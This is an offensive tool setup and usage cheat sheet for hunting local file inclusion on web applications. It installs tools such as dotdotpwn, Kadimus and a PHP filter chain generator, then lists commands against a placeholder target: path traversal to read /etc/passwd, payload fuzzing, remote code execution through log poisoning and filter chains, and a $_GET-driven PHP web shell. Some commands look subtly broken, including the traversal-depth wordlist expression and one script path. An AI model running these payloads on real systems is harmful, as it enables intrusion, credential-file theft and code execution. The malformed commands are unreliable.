# LFI-RFI Hunter — Tool Setup & Usage Guide

## Quick Install

```bash
# === DOTDOTPWN ===
git clone https://github.com/wireghoul/dotdotpwn /opt/dotdotpwn
ln -s /opt/dotdotpwn/dotdotpwn.pl /usr/local/bin/dotdotpwn

# === LFISuite ===
git clone https://github.com/D35m0nd142/LFISuite /opt/LFISuite

# === Kadimus ===
git clone https://github.com/P0cL4bs/Kadimus /opt/Kadimus
cd /opt/Kadimus && make

# === PHP Filter Chain Generator ===
git clone https://github.com/synacktiv/php_filter_chain_generator.git /opt/php_filter_chain_generator

# === Wrapwrap (with suffix) ===
git clone https://github.com/ambionics/wrapwrap.git /opt/wrapwrap

# === Lightyear ===
git clone https://github.com/ambionics/lightyear.git /opt/lightyear

# === ffuf ===
go install github.com/ffuf/ffuf/v2@latest

# === Commix ===
git clone https://github.com/commixproject/commix /opt/commix

# === Gau ===
go install github.com/lc/gau/v2/cmd/gau@latest

# === Katana ===
go install github.com/projectdiscovery/katana/cmd/katana@latest

# === jsluice ===
go install github.com/BishopFox/jsluice/cmd/jsluice@latest

# === webanalyze ===
go install github.com/rverton/webanalyze/cmd/webanalyze@latest

# === uro ===
pip3 install uro

# === SecLists ===
git clone https://github.com/danielmiessler/SecLists /opt/SecLists
```

## Tool Usage — Quick Reference

### dotdotpwn
```bash
# HTTP mode — basic
dotdotpwn.pl -m http -h TARGET -O -f /etc/passwd -k "root:x"

# HTTP mode — custom port
dotdotpwn.pl -m http -h TARGET -p 8080 -O -f /etc/passwd -k "root:x"

# HTTP mode — with cookie
dotdotpwn.pl -m http -h TARGET -O -f /etc/passwd -k "root:x" -C "PHPSESSID=xxxx"

# HTTP mode — with POST
dotdotpwn.pl -m http -h TARGET -O -f /etc/passwd -k "root:x" -D "page=INJECT"

# HTTP mode — SSL
dotdotpwn.pl -m http -h TARGET -s -O -f /etc/passwd -k "root:x"
```

### Kadimus
```bash
# Basic scan
./kadimus -u "https://TARGET/page=INJECT" -f /etc/passwd

# With cookie
./kadimus -u "https://TARGET/page=INJECT" -f /etc/passwd -C "PHPSESSID=xxxx"

# Try PHP wrappers
./kadimus -u "https://TARGET/page=INJECT" -f index.php -S

# Try RCE via log poisoning
./kadimus -u "https://TARGET/page=INJECT" -O -A "<?php system('id'); ?>"
```

### ffuf (LFI fuzzing)
```bash
# Fuzz parameter names with LFI payload
ffuf -u "https://TARGET/FUZZ=../../../etc/passwd" \
  -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  -mr "root:x" \
  -ac -t 50

# Fuzz LFI payloads against known parameter
ffuf -u "https://TARGET/page=FUZZ" \
  -w /opt/SecLists/Fuzzing/LFI/LFI-etcpasswd-Linux.txt \
  -mr "root:x" \
  -ac

# Fuzz traversal depth
ffuf -u "https://TARGET/page=FUZZ/etc/passwd" \
  -w <(seq 1 15 | xargs -I{} echo {'../'..'../'..'../'.}.{}) \
  -mr "root:x"

# Fuzz URL encoding variants
ffuf -u "https://TARGET/page=FUZZ" \
  -w lfi-encoded-payloads.txt \
  -mr "root:x"
```

### PHP Filter Chain Generator
```bash
# Basic RCE
python3 /opt/php_filter_chain_generator/php_filter_chain_generator.py \
  --chain "<?=exec('id');?>"

# Read file
python3 /opt/php_filter_chain_generator/php_filter_chain_generator.py \
  --chain "<?php system('cat /etc/passwd');?>"

# Interactive shell
python3 /opt/php_filter_chain_generator.py \
  --chain "<?php system('\$_GET[\"c\"]');?>"
```

### Wrapwrap (with suffix)
```bash
# Read /etc/passwd with suffix .php
python3 /opt/wrapwrap/wrapwrap.py /etc/passwd "<?php system('id');?>" ".php"

# Use with LFI parameter
curl -sk "https://TARGET/page=php://filter/[WRAP_CHAIN]/resource=php://temp"
```
